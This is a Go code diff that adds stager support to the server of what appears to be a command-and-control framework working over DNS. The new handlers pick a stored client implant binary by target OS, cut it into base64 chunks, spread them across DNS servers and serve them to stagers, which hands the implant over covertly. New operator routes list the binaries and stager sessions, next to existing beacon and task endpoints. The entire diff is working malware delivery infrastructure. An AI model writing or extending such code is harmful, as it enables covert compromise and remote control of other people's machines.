@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"path/filepath"
 	"strconv"
@@ -1079,6 +1080,244 @@ func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
 	api.sendJSON(w, stats)
 }
 
+// Stager Management Handlers
+
+// handleListClientBinaries returns all stored client binaries
+func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Request) {
+	binaries, err := api.db.GetClientBinaries()
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve client binaries")
+		return
+	}
+
+	api.sendJSON(w, binaries)
+}
+
+// handleListStagerSessions returns all stager deployment sessions
+func (api *APIServer) handleListStagerSessions(w http.ResponseWriter, r *http.Request) {
+	sessions, err := api.db.GetStagerSessions(100) // Last 100 sessions
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve stager sessions")
+		return
+	}
+
+	api.sendJSON(w, sessions)
+}
+
+// handleGetStagerSession returns details of a specific stager session
+func (api *APIServer) handleGetStagerSession(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+
+	session, err := api.db.GetStagerSession(sessionID)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, "stager session not found")
+		return
+	}
+
+	api.sendJSON(w, session)
+}
+
+// Stager Protocol Handlers (called by DNS servers)
+
+// StagerInitRequest represents a stager initialization request from DNS server
+type StagerInitRequest struct {
+	StagerIP    string `json:"stager_ip"`
+	OS          string `json:"os"`
+	Arch        string `json:"arch"`
+	DNSServerID string `json:"dns_server_id"`
+}
+
+// StagerInitResponse contains session info and chunk assignments
+type StagerInitResponse struct {
+	SessionID   string   `json:"session_id"`
+	TotalChunks int      `json:"total_chunks"`
+	DNSDomains  []string `json:"dns_domains"`
+	ChunkSize   int      `json:"chunk_size"`
+}
+
+// handleStagerInit processes stager initialization (STG message forwarded from DNS server)
+func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
+	var req StagerInitRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Stager init request: %s (%s/%s) via DNS server %s\n",
+			req.StagerIP, req.OS, req.Arch, dnsServerID)
+	}
+
+	// Find matching client binary
+	binaries, err := api.db.GetClientBinaries()
+	if err != nil || len(binaries) == 0 {
+		api.sendError(w, http.StatusNotFound, "no client binaries available")
+		return
+	}
+
+	// Find binary matching OS/Arch
+	var clientBinary map[string]interface{}
+	for _, binary := range binaries {
+		if strings.EqualFold(binary["os"].(string), req.OS) {
+			clientBinary = binary
+			break
+		}
+	}
+
+	if clientBinary == nil {
+		api.sendError(w, http.StatusNotFound, fmt.Sprintf("no client binary for %s/%s", req.OS, req.Arch))
+		return
+	}
+
+	// Create stager session
+	sessionID := fmt.Sprintf("stg_%d_%d", time.Now().UnixNano(), rand.Intn(10000))
+	totalChunks := clientBinary["total_chunks"].(int)
+
+	err = api.db.CreateStagerSession(
+		sessionID,
+		req.StagerIP,
+		req.OS,
+		req.Arch,
+		clientBinary["id"].(string),
+		dnsServerID,
+		totalChunks,
+	)
+
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to create stager session")
+		if api.config.Debug {
+			fmt.Printf("[API] Failed to create stager session: %v\n", err)
+		}
+		return
+	}
+
+	// Get active DNS servers for distribution
+	dnsServers, err := api.db.GetDNSServers()
+	if err != nil || len(dnsServers) == 0 {
+		api.sendError(w, http.StatusInternalServerError, "no DNS servers available")
+		return
+	}
+
+	// Extract DNS server IDs and domains
+	var dnsServerIDs []string
+	var dnsDomains []string
+	for _, server := range dnsServers {
+		if server["status"].(string) == "active" {
+			dnsServerIDs = append(dnsServerIDs, server["id"].(string))
+			dnsDomains = append(dnsDomains, server["domain"].(string))
+		}
+	}
+
+	if len(dnsServerIDs) == 0 {
+		api.sendError(w, http.StatusInternalServerError, "no active DNS servers")
+		return
+	}
+
+	// Split base64 data into chunks
+	base64Data := clientBinary["base64_data"].(string)
+	chunkSize := clientBinary["chunk_size"].(int)
+	var chunks []string
+	for i := 0; i < len(base64Data); i += chunkSize {
+		end := i + chunkSize
+		if end > len(base64Data) {
+			end = len(base64Data)
+		}
+		chunks = append(chunks, base64Data[i:end])
+	}
+
+	// Assign chunks to DNS servers (round-robin)
+	err = api.db.AssignStagerChunks(sessionID, clientBinary["id"].(string), chunks, dnsServerIDs)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to assign chunks")
+		if api.config.Debug {
+			fmt.Printf("[API] Failed to assign chunks: %v\n", err)
+		}
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Stager session created: %s (%d chunks across %d DNS servers)\n",
+			sessionID, totalChunks, len(dnsServerIDs))
+	}
+
+	// Return session info and DNS domains list
+	response := StagerInitResponse{
+		SessionID:   sessionID,
+		TotalChunks: totalChunks,
+		DNSDomains:  dnsDomains,
+		ChunkSize:   chunkSize,
+	}
+
+	api.sendJSON(w, response)
+}
+
+// StagerChunkRequest represents a chunk request from DNS server
+type StagerChunkRequest struct {
+	SessionID  string `json:"session_id"`
+	ChunkIndex int    `json:"chunk_index"`
+	StagerIP   string `json:"stager_ip"`
+}
+
+// StagerChunkResponse contains chunk data
+type StagerChunkResponse struct {
+	ChunkIndex int    `json:"chunk_index"`
+	ChunkData  string `json:"chunk_data"`
+	Success    bool   `json:"success"`
+	Message    string `json:"message,omitempty"`
+}
+
+// handleStagerChunk processes chunk requests (ACK message forwarded from DNS server)
+func (api *APIServer) handleStagerChunk(w http.ResponseWriter, r *http.Request) {
+	var req StagerChunkRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Get chunk from database
+	chunkData, assignedDNS, err := api.db.GetStagerChunk(req.SessionID, req.ChunkIndex)
+	if err != nil {
+		api.sendJSON(w, StagerChunkResponse{
+			ChunkIndex: req.ChunkIndex,
+			Success:    false,
+			Message:    "chunk not found",
+		})
+		return
+	}
+
+	// Mark chunk as delivered
+	if err := api.db.MarkStagerChunkDelivered(req.SessionID, req.ChunkIndex); err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to mark chunk as delivered: %v\n", err)
+		}
+	}
+
+	// Update session activity
+	api.db.UpdateStagerSessionActivity(req.SessionID)
+
+	if api.config.Debug {
+		fmt.Printf("[API] Chunk %d for session %s served by %s (assigned to %s)\n",
+			req.ChunkIndex, req.SessionID, dnsServerID, assignedDNS)
+	}
+
+	// Return chunk data
+	response := StagerChunkResponse{
+		ChunkIndex: req.ChunkIndex,
+		ChunkData:  chunkData,
+		Success:    true,
+	}
+
+	api.sendJSON(w, response)
+}
+
 // SetupRoutes configures all API routes
 func (api *APIServer) SetupRoutes(router *mux.Router) {
 	// Web UI endpoints (serve HTML)
@@ -1125,10 +1364,15 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	// Builder endpoints
 	operatorRouter.HandleFunc("/builder/dns-server", api.handleBuildDNSServer).Methods("POST")
 	operatorRouter.HandleFunc("/builder/client", api.handleBuildClient).Methods("POST")
+	operatorRouter.HandleFunc("/builder/client-binaries", api.handleListClientBinaries).Methods("GET")
 	operatorRouter.HandleFunc("/builder/stager", api.handleBuildStager).Methods("POST")
 	operatorRouter.HandleFunc("/builder/builds", api.handleListBuilds).Methods("GET")
 	operatorRouter.HandleFunc("/builder/builds/download", api.handleDownloadBuild).Methods("GET")
 	operatorRouter.HandleFunc("/builder/builds/delete", api.handleDeleteBuild).Methods("DELETE")
+
+	// Stager session endpoints
+	operatorRouter.HandleFunc("/stager/sessions", api.handleListStagerSessions).Methods("GET")
+	operatorRouter.HandleFunc("/stager/sessions/{id}", api.handleGetStagerSession).Methods("GET")
 
 	// DNS server endpoints (API key auth required)
 	dnsRouter := router.PathPrefix("/api/dns-server").Subrouter()
@@ -1140,6 +1384,10 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
 	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
 	dnsRouter.HandleFunc("/beacons", api.handleGetBeaconsForDNSServer).Methods("GET")
+
+	// Stager protocol endpoints (called by DNS servers on behalf of stagers)
+	dnsRouter.HandleFunc("/stager/init", api.handleStagerInit).Methods("POST")
+	dnsRouter.HandleFunc("/stager/chunk", api.handleStagerChunk).Methods("POST")
 
 	// Health check endpoint (no auth)
 	router.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
